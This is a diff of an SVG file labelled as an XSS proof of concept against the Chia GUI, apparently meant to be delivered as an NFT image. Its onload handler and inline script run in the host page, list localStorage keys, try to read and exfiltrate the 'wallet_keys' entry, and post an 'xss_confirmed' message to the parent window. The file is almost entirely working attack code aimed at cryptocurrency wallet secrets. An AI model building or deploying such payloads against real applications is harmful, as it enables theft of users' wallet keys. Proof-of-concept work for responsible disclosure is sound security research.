@@ -1,28 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!--  XSS PoC SVG for Chia GUI  -->
+<!-- XSS PoC SVG for Chia GUI -->
 <svg xmlns="http://www.w3.org/2000/svg"
      width="100" height="100"
-     onload="alert('Chia GUI XSS PoC – SVG loaded (but <img> tags will block script execution)')">
+     onload="alert('Chia GUI XSS PoC – SVG loaded');">
 
-  <!-- Main graphic -->
+  <!-- Visible content -->
   <rect width="100" height="100" fill="red"/>
   <text x="10" y="55" fill="white" font-size="12">PWNED</text>
 
-  <!-- Payload -->
+  <!-- Inline payload -->
   <script type="application/ecmascript"><![CDATA[
-    // This code executes only when the SVG is rendered **inline**
-    // (e.g. via <iframe srcdoc="..."> or <object> / <embed>).
-    // It will NOT run if the SVG is displayed through an <img> tag.
+    alert('Chia GUI XSS PoC – inline script running');
+    console.log('localStorage keys →', Object.keys(window.top.localStorage || {}));
 
-    alert('Chia GUI XSS PoC - SVG inline script running');
-    console.log('Iframe/parent localStorage keys →', Object.keys(window.top.localStorage || {}));
-
-    /* Attempt to enumerate exposed Electron APIs (if any) */
-    if (window.top && window.top.chia) {
-      console.log('Electron APIs exposed on window.top.chia:', Object.keys(window.top.chia));
-    }
-
-    /* Exfiltrate first 100 bytes of wallet_keys (if present) */
+    /* Try to exfiltrate first 100 bytes of wallet keys (if present) */
     try {
       const keys = window.top.localStorage.getItem('wallet_keys');
       if (keys) {
@@ -36,12 +27,10 @@
       console.log('localStorage access blocked:', e);
     }
 
-    /* Signal success back to parent */
-    window.top.postMessage({
-      source: 'chia_nft_svg',
-      type:   'xss_confirmed',
-      detail: 'SVG inline script executed'
-    }, '*');
+    /* Signal success */
+    window.top.postMessage(
+      { source: 'chia_nft_svg', type: 'xss_confirmed' },
+      '*'
+    );
   ]]></script>
-
 </svg>
